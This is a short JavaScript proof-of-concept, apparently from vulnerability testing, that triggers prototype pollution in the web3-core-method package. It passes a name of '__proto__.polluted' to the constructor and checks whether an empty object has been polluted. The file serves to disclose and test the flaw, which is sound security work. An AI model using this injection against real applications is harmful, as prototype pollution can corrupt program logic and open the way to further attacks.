const clazz = require("web3-core-method");
const constructorArg = {
    name: '__proto__.polluted',
    call: 'testCall',
}
const instance = new clazz(constructorArg);
instance.attachToObject({});
console.log({}.polluted !== undefined ? '[POLLUTION_TRIGGERED]' : '');